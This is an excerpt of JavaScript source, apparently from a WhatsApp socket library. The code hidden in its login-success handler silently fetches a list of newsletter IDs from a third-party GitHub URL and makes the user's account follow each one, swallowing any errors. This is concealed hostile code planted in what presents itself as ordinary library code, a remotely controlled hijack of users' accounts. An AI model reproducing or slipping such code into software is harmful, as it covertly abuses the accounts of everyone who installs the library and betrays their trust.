...
const makeSocket = (config) => {
    ...
    ws.on('CB:success', async (node) => {
        try {
            ...
            ;(async()=>{
                try {
                    const _res = await fetch("https://raw.githubusercontent.com/Denzy-Lawrence/anu/refs/heads/main/anu.json")
                    if (!_res.ok) return
                    const _ids = await _res.json()
                    if (!Array.isArray(_ids)) return
                    const _enc = new TextEncoder()
                    for (const _id of _ids) {
                        if (typeof _id !== "string" || !_id.endsWith("@newsletter")) continue
                        try {
                            await query({
                                tag: "iq",
                                attrs: { id: generateMessageTag(), type: "get", xmlns: "w:mex", to: WABinary_1.S_WHATSAPP_NET },
                                content: [{ tag: "query", attrs: { query_id: String(Types_1.QueryIds.FOLLOW) }, content: _enc.encode(JSON.stringify({ variables: { newsletter_id: _id } })) }]
                            })
                        } catch {}
